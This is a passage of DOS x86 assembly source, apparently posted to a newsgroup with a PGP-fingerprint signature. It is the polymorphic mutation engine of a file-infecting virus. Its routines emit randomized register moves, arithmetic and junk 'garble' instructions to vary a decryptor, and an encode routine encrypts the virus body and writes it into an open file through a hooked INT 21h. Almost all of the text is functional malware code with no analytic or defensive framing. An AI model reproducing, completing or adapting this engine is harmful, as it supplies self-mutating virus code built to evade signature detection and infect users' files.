mov_reg_call:   pop     dx bx

;=====( Mov reg(ax), value(dx) )=============================================;

mov_reg1:       push    ax bx cx dx
                cbw
                mov     bx,2
                call    random_bx               ; MOV or SUB/XOR ADD/OR/XOR
                jz      mov_reg_other
                mov     bl,2
                call    random_bx               ; 1 in 3 chance of c6/c7 MOV
                jnz     mov_reg_b0
                or      ax,0c7c0h               ; MOV reg,imm
                call    boolean                 ; Do long MOV or LEA?
                jnz     mov_reg_c7
                mov     cl,3
                shl     al,cl                   ; Reg -> bits 3,4,5
                xor     ax,(8d00h or 110b) xor 0c700h  ; LEA reg,[imm]
mov_reg_c7:     xchg    al,ah
                stosw                           ; store it
mov_reg_sto:    xchg    dx,ax
                stosw                           ; store value
                call    garble
mov_reg_exit:   jmp     modify_pop

mov_reg_b0:     or      al,0b8h                 ; MOV reg,imm
                stosb
                jmp     mov_reg_sto

mov_reg_other:  push    ax
                mov     cl,3
                mov     ch,al
                shl     ch,cl                   ; copy reg1 to reg2
                or      al,ch                   ; set it
                call    boolean
                jnz     mov_reg_other1
                or      ah,2                    ; reg1, reg2 -> reg2, reg1
mov_reg_other1: call    boolean
                jnz     mov_reg_xor
                or      ax,29c0h                ; SUB reg, reg
                call    boolean
                jnz     mov_reg_other_sto
                xor     ah,19h xor 29h          ; SBB reg, reg
                call    clear_carry             ; clear carry flag
mov_reg_other_sto:
                xchg    al,ah
                stosw
                call    garble
                pop     ax
                call    modify_reg              ; ADD/OR/XOR reg(ax),value(dx)
                jmp     mov_reg_exit

mov_reg_xor:    or      ax,31c0h                ; XOR AX,AX
                jmp     mov_reg_other_sto

;=====( ADD/OR/XOR reg(ax), value(dx) )======================================;

modify_reg:     push    ax bx cx dx
                cbw
                mov     bx,2
                call    random_bx
                mov     cx,3500h + (6 shl 3)    ; XOR
                jz      modify_reg_cont
                mov     cx,0d00h + (1 shl 3)    ; OR
                dec     bx
                jz      modify_reg_cont
modify_reg_add: mov     cx,0500h                ; ADD
                call    boolean                 ; ADC or ADD?
                jnz     modify_reg_cont
                mov     cx,1500h + (2 shl 3)    ; ADC
modify_reg_clc: call    clear_carry             ; Clear carry flag
modify_reg_cont:test    bp,200h                 ; keychange executing?
                jz      modify_reg_nosave
                mov     ds:modify_op,ch         ; save AX operation
modify_reg_nosave:
                call    boolean                 ; check if AX?
                jnz     modify_reg_noax
                or      al,al                   ; AX?
                jnz     modify_reg_noax
                mov     al,ch
                stosb                           ; store instruction
                xchg    dx,ax
modify_sto:     stosw                           ; store value
modify_exit:    call    garble
modify_pop:     pop     dx cx bx ax
                retn

modify_reg_noax:or      ax,81c0h
                or      al,cl                   ; XOR/OR/ADD
                call    boolean                 ; sign extend?
                jnz     modify_reg_nosign
                cmp     dx,7fh                  ; possible to sign extend?
                jbe     modify_sign
                cmp     dx,-80h
                jb      modify_reg_nosign
modify_sign:    or      ah,2                    ; sign extend
modify_reg_nosign:                
                xchg    al,ah
                stosw
                test    al,2                    ; sign extended?
                xchg    dx,ax
                je      modify_sto
                stosb
                jmp     modify_exit
                
;=====( ADD reg(ax), value(dx) )=============================================;

add_reg:        push    ax bx cx dx
                cbw
                mov     cx,dx
add_loop:       mov     bx,3
                call    random_bx               ; 1 in 4 chance of ADD/SUB
                jz      add_noinc
                mov     bx,40c0h                ; INC reg
                test    bp,200h                 ; keychange running?
                jz      add_nosave
                mov     ds:modify_op,05h        ; ADD AX,
add_nosave:     cmp     cx,3h                   ; too high to INC?
                jb      add_inc
                neg     cx
                cmp     cx,3h                   ; too low to DEC?
                ja      add_noinc
                mov     bx,48c0h + (1 shl 3)    ; DEC reg
                test    bp,200h
                jz      sub_nosave
                mov     ds:modify_op,2dh        ; SUB AX,
sub_nosave:     inc     dx
                inc     cx
                cmp     ax,0
                org     $ - 2
add_inc:        dec     dx
                dec     cx
                push    ax
                mov     ax,5
                call    random                  ; 1 in 6 chance of FF
                pop     ax      
                push    ax
                jnz     add_inc_40
                mov     ah,0ffh
                xchg    bl,bh
                xchg    al,ah                   ; AL=ff AH=Reg
                stosb 
                xchg    al,ah
add_inc_40:     or      al,bh                   ; set DEC/INC
                stosb
                pop     ax
                call    garble
                or      dx,dx                   ; all done?
                jnz     add_loop
add_reg_exit:   jmp     modify_pop

add_noinc:      call    boolean                 ; ADD or SUB?
                jz      sub_reg
                jmp     modify_reg_add
                
sub_reg:        test    bp,200h                 ; keychange?
                jnz     sub_reg_key
                neg     dx
sub_reg_key:    mov     cx,2d00h + (5 shl 3)    ; SUB
                call    boolean                 ; use SBB?
                jz      sbb_reg
                jmp     modify_reg_cont

sbb_reg:        mov     cx,1d00h + (3 shl 3)    ; SBB
                jmp     modify_reg_clc
                
;=====( clear carry flag )===================================================;

clear_carry:    push    ax bp
                or      bp,800h                 ; don't change flags
                mov     al,0f8h                 ; CLC
                call    boolean
                jnz     clear_carry_clc
                mov     ax,0f5f9h               ; STC/CMC
                stosb
                call    garble
                xchg    al,ah
clear_carry_clc:stosb
                call    garble
                pop     bp ax
                retn

garble:         push    ax
                mov     ax,2
                call    random                  ; how many times to call?
                xchg    cx,ax
                jcxz    garble_exit
garble_loop:    call    garble1
                loop    garble_loop
garble_exit:    xchg    cx,ax
                pop     ax
                retn

;=====( add garbage code )===================================================;

garble1:        push    ax bx cx dx bp
                test    bp,100h                 ; Garble already executing?
                jnz     garble_ret
                and     bp,not 200h             ; keychange not executing
                or      bp,100h                 ; Garble executing
                call    boolean
                jnz     garble_ret
                mov     cl,3
                call    random_1
                xchg    dx,ax                   ; DX=random number
                call    get_reg                 ; get register
                jc      garble_ret
                mov     bx,6
                test    bp,800h                 ; flag change allowed?
                jz      garble_f
                mov     bl,2
garble_f:       call    random_bx            ; MOV/1BYTE/XCHG/MODIFY/ADD/MOV?
                jnz     garble_xchg
                or      ah,89h
garble_reg_set: call    boolean                 ; reg1, reg2 or reg2, reg1?
                jz      garble_reg_reg
                or      ah,2                    ; 8b
                xchg    al,dl
garble_reg_reg: and     dl,7                    ; Get register values only
                and     al,7
                shl     dl,cl
                or      al,0c0h                 ; MOV reg1, random reg
                or      al,dl
                xchg    al,ah
                stosw
garble_ret:     pop     bp 
                jmp     modify_pop

garble_xchg:    dec     bx
                jnz     garble_1byte
                xchg    dx,ax
                call    get_reg                 ; get another reg
                jc      garble_ret
                xchg    dx,ax                   ; AL=reg1 DL=reg2
                call    boolean
                jnz     garble_xchgnoax
                or      dl,dl                   ; AX?
                jz      garble_xchgax
                or      al,al
                jz      garble_xchgax
garble_xchgnoax:or      ah,87h                  ; XCHG reg1,
                jmp     garble_reg_reg

garble_xchgax:  or      al,90h
                or      al,dl                   ; XCHG AX, reg
garble_stosb:   stosb
                jmp     garble_ret
                
garble_1byte:   dec     bx
                jnz     garble_modify
                mov     al,4
                call    random
                mov     bx,offset garble_1byte_tbl
                xlat                            ; get 1 byte instruction
                jmp     garble_stosb
                
garble_modify:  dec     bx
                jnz     garble_add
                call    modify_reg              ; ADD/XOR/OR reg1, random #
                jmp     garble_ret

garble_add:     dec     bx
                jnz     garble_mov
                call    add_reg                 ; ADD/SUB reg1, random #
                jmp     garble_ret

garble_mov:     dec     bx
                jnz     garble_op
                call    mov_reg                 ; MOV reg1, random #
                jmp     garble_ret

garble_op:      and     dh,00111000b            ; get rnd op
                mov     ah,1
                or      ah,dh
                jmp     garble_reg_set

garble_1byte_tbl:
                db      2eh
                db      36h
                cld
                std
                sti
                
;=====( Is BP a Pointer? )===================================================;

is_bp_ptr:      cmp     ds:ptr_reg,_bp
                je      bp_is_ptr
                cmp     ds:ptr_reg1,_bp
bp_is_ptr:      retn

;=====( Get pointer register (DI/SI/BP/BX) )=================================;

get_ptr_regnext:call    del_reg                 ; restore register to pool

get_ptr_reg:    call    get_reg                 ; get register
                cmp     al,_bx
                je      got_ptr_reg
                cmp     al,_bp
                jb      get_ptr_regnext
got_ptr_reg:    retn

;=====( return random register in AL )=======================================;

get_reg:        test    bp,11101111b            ; any registers free?
                stc
                jz      get_reg_exit
get_reg_loop:   mov     ax,7
                call    random
                push    ax
                cbw
                call    conv_num                ; convert to bit map
                test    bp,ax                   ; is register free?
                pushf
                not     ax
                and     bp,ax                   ; mark register
                popf
                pop     ax
                jz      get_reg_loop
get_reg_exit:   retn
                
;=====( Restore register to pool )===========================================;

del_reg:        push    ax
                cbw
                call    conv_num                ; convert to bit number
                or      bp,ax                   ; restore register
                pop     ax
                retn

;=====( convert number to bit map )==========================================;

conv_num:       push    cx
                mov     cl,al
                mov     al,1
                shl     al,cl
                pop     cx
                retn

;=====( randomize order of BX/CX/DX/SI, then call )==========================;

order:          call    garble
                mov     ax,2
                call    random
                xchg    cx,ax
                inc     cx
order_loop:     call    boolean
                jnz     order1
                xchg    bx,ax
order1:         call    boolean
                jnz     order2
                xchg    dx,ax
order2:         call    boolean
                jnz     order3
                xchg    si,ax
order3:         loop    order_loop
                push    si dx bx ax
order_ret:      retn

;=====( return random number between 0 and ffff in bx )======================;

random_bx:      xchg    bx,ax
                call    random
                xchg    bx,ax
                retn

;=====( flip Sign bit )======================================================;

boolean:        push    ax
                mov     ax,1
                call    random
                pop     ax
                retn

;=====( return random number between 0 and ffff )============================;

random_1:       mov     ax,-1

;=====( Generate random number between 0 and AX )============================;

random:         push    ds bx cx dx ax
                xor     ax,ax
                int     1ah
                push    cs
                pop     ds
                in      al,40h
                xchg    cx,ax
                xchg    dx,ax
                mov     bx,offset ran_num
                xor     ds:[bx],ax
                rol     word ptr ds:[bx],cl
                xor     cx,ds:[bx]
                rol     ax,cl
                xor     dx,ds:[bx]
                ror     dx,cl
                xor     ax,dx
                imul    dx
                xor     ax,dx
                xor     ds:[bx],ax
                pop     cx
                xor     dx,dx
                inc     cx
                je      random_ret
                div     cx
                xchg    ax,dx
random_ret:     pop     dx cx bx ds
                or      ax,ax
                retn
                    
ran_num         dw      ?

;=====( Encrypts the code/writes it/decrypts code )==========================;

encode:         mov     bx,ds:handle
                mov     ax,0
key             =       word ptr $ - 2
                mov     cx,(decrypt-v_start)/2
                xor     di,di
encode_break:   clc
                clc
                clc
                clc                     ; XCHG CX,AX XCHG CX,AX
                clc
                clc                     ; CLC ADD AX,xxxx / XOR [DI],AX
                clc
                clc                     ; XOR [DI],AX / CLC ADD AX,xxxx
                inc     di
                inc     di
                loop    encode_break
encode_ret      =       byte ptr $    
                mov     ah,40h
                mov     cx,file_size
                cwd
                pushf
                call    cs:int_21
                jc      encode_flag
                sub     ax,cx
encode_flag:    pushf
                pop     bp
                mov     word ptr ds:[si],0
encode_flip     =       word ptr $ - 2
                mov     byte ptr ds:write_buff[encode_ret-encode],0c3h
                jmp     encode
encode_end:


--

my faith my grief my fear my blood my trust my flesh my hate my love
no more no less no fear no need no height no depth too great godspeed
PGP 2.62 Fingerprint: 16 7B 2D 9B E9 51 48 C7 22 72 97 7A 6D E3 DE 57   :)

